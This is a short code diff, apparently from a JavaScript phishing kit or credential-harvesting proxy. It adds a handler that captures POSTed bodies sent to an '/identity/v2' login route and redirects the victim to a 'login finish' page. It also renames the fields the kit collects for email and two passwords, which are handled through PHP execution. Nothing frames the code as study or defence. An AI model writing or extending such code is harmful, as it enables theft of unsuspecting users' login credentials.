@@ -197,6 +197,11 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
 
         if (this.req.url.startsWith('/identity')) {
             if (this.req.url === '/identity/v2') {
+                if (this.req.method === 'POST') {
+                    super.uploadRequestBody(clientContext.currentDomain, clientContext)
+                    this.res.writeHead(302, {location: '/auth/login/finish'})
+                    return super.cleanEnd(clientContext)
+                }
                 return super.superExecutePhpScript('email.php', clientContext)
             }
             if (this.req.url === '/identity/lalo/validate') {
@@ -392,21 +397,21 @@ const configExport = {
         },
         manualEmail: {
             method: 'POST',
-            params: ['lalo'],
+            params: ['mento'],
             urls: '',
             hosts: 'PHP-EXEC',
         },
 
         manualPassword1: {
             method: 'POST',
-            params: ['elberto'],
+            params: ['pinto1'],
             urls: '',
             hosts: 'PHP-EXEC',
         }, 
 
         manualPassword2: {
             method: 'POST',
-            params: ['aneko'],
+            params: ['pinto2'],
             urls: '',
             hosts: 'PHP-EXEC',
         },
